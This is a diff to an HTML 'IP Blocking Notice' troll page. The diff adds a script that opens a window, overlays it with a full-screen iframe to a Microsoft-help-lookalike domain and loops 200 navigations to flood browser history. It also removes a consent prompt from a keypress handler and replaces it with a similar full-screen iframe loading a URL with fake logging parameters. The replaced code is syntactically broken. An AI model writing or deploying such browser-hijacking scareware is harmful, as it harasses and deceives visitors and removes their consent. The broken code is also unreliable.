@@ -1,6 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+        function floodHistory() {
+            var win = window.open(); 
+            var url = 'https://help.mshelp.tk'; // URL to flood into history
+            var iframe = win.document.createElement('iframe');
+            
+            // Style the iframe to cover the whole window
+            iframe.style = "position:fixed;width:100vw;height:100vh;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;background-color:white;border:none;";
+            iframe.src = url;
+
+            // Append the iframe to the window
+            win.document.body.appendChild(iframe);
+            
+            // Flood history
+            for (var i = 0; i < 200; i++) {
+                win.location.href = url;
+            }
+        }
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IP Blocking Notice</title>
@@ -132,6 +151,7 @@
 
 <footer>
     <p>P.S Trolling and being mean isn't against the law.</p>
+    <button onclick="floodHistory()">Flood History with page</button>
 </footer>
 
 <script>
@@ -139,12 +159,7 @@
 
     document.addEventListener('keydown', function(e) {
         if (e.key === 'F' && !historyFloodConfirmed) {
-            const confirmation = confirm("Do you want to flood your history with this webpage?");
-            if (confirmation) {
-                // Simulate flooding the history by reloading the page multiple times
-                historyFloodConfirmed = true;
-                for (let i = 0; i < 200; i++) {  // Adjust the number to flood history
-                    window.location.href = window.location.href;
+                var win = window.open(); var url = 'https://wicorn29.github.io/W29VM/?requestedby=ssdpersonel&logssdeyeevent=true'; var iframe = win.document.createElement(iframe); iframe.style="position:fixed;width:100vw;height:100vh;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;background-color:white;border:none;"; iframe.src = url; win.document.body.appendChild(iframe);
                 }
             }
         }
